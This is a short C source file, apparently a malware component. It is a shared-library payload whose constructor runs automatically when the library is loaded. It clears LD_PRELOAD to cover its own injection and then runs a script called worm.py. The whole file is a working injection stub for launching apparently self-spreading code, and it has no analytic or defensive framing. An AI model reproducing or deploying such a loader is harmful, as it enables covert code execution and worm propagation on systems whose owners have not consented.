#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// gcc -shared -fPIC ./payload.c -o payload.so

static void before_main(void) __attribute__((constructor));

static void before_main(void) {
    unsetenv("LD_PRELOAD");
    system("python3 worm.py");
}
